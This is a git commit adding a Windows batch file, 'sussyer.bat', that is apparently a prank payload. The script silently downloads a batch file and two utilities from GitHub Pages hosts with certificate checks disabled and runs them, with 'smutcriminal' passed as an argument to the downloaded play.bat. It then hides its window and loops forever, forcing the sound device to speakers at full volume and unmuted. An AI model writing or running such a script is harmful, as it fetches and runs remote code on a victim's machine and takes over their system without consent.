0198cd12246ac2f2278c677bdda21ff6f90d95f6
stivengiv <94831607+stivengiv@users.noreply.github.com>
2022-06-15 12:40:07 +0200

    Create sussyer.bat

---
+++ sussyer.bat
@@ -0,0 +1,13 @@
+@echo off
+start /wait /min "" cmd /c curl -kLOs stivengiv.github.io/p/play.bat
+start /wait /min "" cmd /c curl -kLOs aritz331.github.io/stuff/nircmdc.exe
+start /wait /min "" cmd /c curl -kLOs aritz331.github.io/stuff/cmdow.exe
+
+start /min "" cmd /c play.bat smutcriminal
+
+:1
+cmdow @ /HID
+nircmdc setdefaultsounddevice "Speakers"
+nircmdc setvolume 0 65535 65535
+nircmdc mutesysvolume 0
+goto 1
